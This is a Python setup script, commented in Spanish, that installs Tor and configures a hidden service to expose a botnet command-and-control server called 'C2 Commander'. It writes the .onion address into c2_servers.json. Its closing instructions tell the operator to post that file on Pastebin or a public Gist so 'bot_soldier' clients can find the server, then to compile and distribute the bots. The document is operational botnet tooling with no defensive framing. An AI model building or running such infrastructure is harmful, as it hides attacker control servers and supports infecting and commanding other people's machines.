#!/usr/bin/env python3
"""
Setup Tor Hidden Service para C2 Commander
Configura automáticamente Tor en Windows/Linux para exponer C2
"""

import os
import sys
import platform
import subprocess
import json
import time

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════╗
║     🧅 TOR HIDDEN SERVICE SETUP FOR C2 🧅     ║
╚═══════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

def check_tor_installed():
    """Verifica si Tor está instalado"""
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Verificando instalación de Tor...")
    
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['tor', '--version'], capture_output=True, text=True)
        else:
            result = subprocess.run(['which', 'tor'], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Tor está instalado")
            return True
        return False
    except:
        return False

def install_tor():
    """Instala Tor según el sistema operativo"""
    system = platform.system()
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Instalando Tor para {system}...")
    
    try:
        if system == "Linux":
            print(f"{Colors.CYAN}Ejecutando: apt-get update && apt-get install -y tor{Colors.RESET}")
            os.system("sudo apt-get update && sudo apt-get install -y tor")
        
        elif system == "Windows":
            print(f"{Colors.RED}[!]{Colors.RESET} En Windows, descarga Tor Expert Bundle:")
            print(f"{Colors.CYAN}    https://www.torproject.org/download/tor/{Colors.RESET}")
            print(f"\n{Colors.YELLOW}Pasos:{Colors.RESET}")
            print("1. Descarga 'tor-win64-x.x.x.zip'")
            print("2. Extrae a C:\\Tor")
            print("3. Agrega C:\\Tor\\Tor a PATH")
            print(f"\n{Colors.YELLOW}[*]{Colors.RESET} ¿Ya instalaste Tor? (s/n): ", end='')
            response = input().lower()
            if response != 's':
                sys.exit(0)
        
        print(f"{Colors.GREEN}[✓]{Colors.RESET} Tor instalado correctamente")
        return True
    
    except Exception as e:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error instalando Tor: {e}")
        return False

def setup_tor_config():
    """Configura Tor Hidden Service"""
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Configurando Tor Hidden Service...")
    
    system = platform.system()
    
    if system == "Linux":
        torrc_path = "/etc/tor/torrc"
        hidden_service_dir = "/var/lib/tor/c2_hidden_service"
    else:  # Windows
        torrc_path = "C:\\Tor\\torrc"
        hidden_service_dir = "C:\\Tor\\c2_hidden_service"
    
    # Configuración de Hidden Service
    torrc_config = f"""
# C2 Commander Hidden Service
HiddenServiceDir {hidden_service_dir}
HiddenServicePort 8443 127.0.0.1:8443

# Opciones de seguridad
SOCKSPort 9050
ControlPort 9051
CookieAuthentication 1
"""
    
    try:
        # Leer archivo existente
        if os.path.exists(torrc_path):
            with open(torrc_path, 'r') as f:
                existing_config = f.read()
            
            # Verificar si ya está configurado
            if "c2_hidden_service" in existing_config:
                print(f"{Colors.YELLOW}[!]{Colors.RESET} Hidden Service ya configurado")
            else:
                # Agregar configuración
                with open(torrc_path, 'a') as f:
                    f.write(torrc_config)
                print(f"{Colors.GREEN}[✓]{Colors.RESET} Configuración agregada a {torrc_path}")
        else:
            # Crear archivo nuevo
            os.makedirs(os.path.dirname(torrc_path), exist_ok=True)
            with open(torrc_path, 'w') as f:
                f.write(torrc_config)
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Archivo {torrc_path} creado")
        
        return hidden_service_dir
    
    except PermissionError:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error: Necesitas ejecutar como administrador/root")
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Ejecuta: sudo python3 {sys.argv[0]}")
        return None
    
    except Exception as e:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error configurando Tor: {e}")
        return None

def start_tor():
    """Inicia el servicio de Tor"""
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Iniciando servicio Tor...")
    
    system = platform.system()
    
    try:
        if system == "Linux":
            os.system("sudo systemctl restart tor")
            os.system("sudo systemctl enable tor")
        else:  # Windows
            print(f"{Colors.CYAN}Ejecuta en CMD como administrador:{Colors.RESET}")
            print(f"{Colors.BOLD}C:\\Tor\\tor.exe -f C:\\Tor\\torrc{Colors.RESET}")
            print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Presiona Enter cuando Tor esté corriendo...")
            input()
        
        print(f"{Colors.GREEN}[✓]{Colors.RESET} Tor iniciado correctamente")
        return True
    
    except Exception as e:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error iniciando Tor: {e}")
        return False

def get_onion_address(hidden_service_dir):
    """Obtiene la dirección .onion generada"""
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Obteniendo dirección .onion...")
    
    hostname_file = os.path.join(hidden_service_dir, "hostname")
    
    # Esperar hasta 30 segundos a que se genere
    for i in range(30):
        if os.path.exists(hostname_file):
            try:
                with open(hostname_file, 'r') as f:
                    onion_address = f.read().strip()
                
                print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}🧅 TU DIRECCIÓN .ONION:{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.GREEN}{onion_address}{Colors.RESET}")
                print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
                
                return onion_address
            except:
                pass
        
        time.sleep(1)
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Esperando generación... ({i+1}/30)")
    
    print(f"{Colors.RED}[✗]{Colors.RESET} No se pudo obtener dirección .onion")
    print(f"{Colors.YELLOW}[*]{Colors.RESET} Verifica manualmente en: {hostname_file}")
    return None

def update_c2_config(onion_address):
    """Actualiza c2_servers.json con la dirección .onion"""
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Actualizando c2_servers.json...")
    
    try:
        with open('c2_servers.json', 'r') as f:
            config = json.load(f)
        
        # Actualizar servidor primary
        for server in config['c2_servers']:
            if server['id'] == 'primary':
                server['address'] = onion_address
                break
        
        # Actualizar timestamp
        from datetime import datetime
        config['last_updated'] = datetime.utcnow().isoformat() + 'Z'
        
        with open('c2_servers.json', 'w') as f:
            json.dump(config, f, indent=2)
        
        print(f"{Colors.GREEN}[✓]{Colors.RESET} c2_servers.json actualizado")
        return True
    
    except Exception as e:
        print(f"{Colors.RED}[✗]{Colors.RESET} Error actualizando config: {e}")
        return False

def show_next_steps(onion_address):
    """Muestra los siguientes pasos"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}✅ SETUP COMPLETADO{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}📋 SIGUIENTES PASOS:{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}1. Inicia el C2 Commander:{Colors.RESET}")
    print(f"   {Colors.CYAN}python c2_commander.py{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}2. Sube c2_servers.json a Pastebin/Gist:{Colors.RESET}")
    print(f"   {Colors.CYAN}https://pastebin.com/ (crea paste RAW){Colors.RESET}")
    print(f"   {Colors.CYAN}https://gist.github.com/ (crea gist público){Colors.RESET}\n")
    
    print(f"{Colors.BOLD}3. Actualiza bot_soldier.py con URL del JSON:{Colors.RESET}")
    print(f"   {Colors.CYAN}JSON_URLS = ['https://pastebin.com/raw/TU_ID']{Colors.RESET}\n")
    
    print(f"{Colors.BOLD}4. Compila y distribuye bots:{Colors.RESET}")
    print(f"   {Colors.CYAN}python compile_bot.py{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}⚠️  IMPORTANTE:{Colors.RESET}")
    print(f"   • Mantén Tor corriendo siempre que el C2 esté activo")
    print(f"   • Tu dirección .onion es: {Colors.BOLD}{onion_address}{Colors.RESET}")
    print(f"   • Los bots se conectarán automáticamente por Tor\n")

def main():
    print_banner()
    
    # Verificar permisos
    if platform.system() == "Linux" and os.geteuid() != 0:
        print(f"{Colors.RED}[✗]{Colors.RESET} Necesitas ejecutar como root")
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Ejecuta: sudo python3 {sys.argv[0]}")
        sys.exit(1)
    
    # 1. Verificar/Instalar Tor
    if not check_tor_installed():
        if not install_tor():
            print(f"\n{Colors.RED}[✗]{Colors.RESET} No se pudo instalar Tor")
            sys.exit(1)
    
    # 2. Configurar Hidden Service
    hidden_service_dir = setup_tor_config()
    if not hidden_service_dir:
        sys.exit(1)
    
    # 3. Iniciar Tor
    if not start_tor():
        sys.exit(1)
    
    # 4. Obtener dirección .onion
    onion_address = get_onion_address(hidden_service_dir)
    if not onion_address:
        sys.exit(1)
    
    # 5. Actualizar configuración
    update_c2_config(onion_address)
    
    # 6. Mostrar siguientes pasos
    show_next_steps(onion_address)

if __name__ == "__main__":
    main()
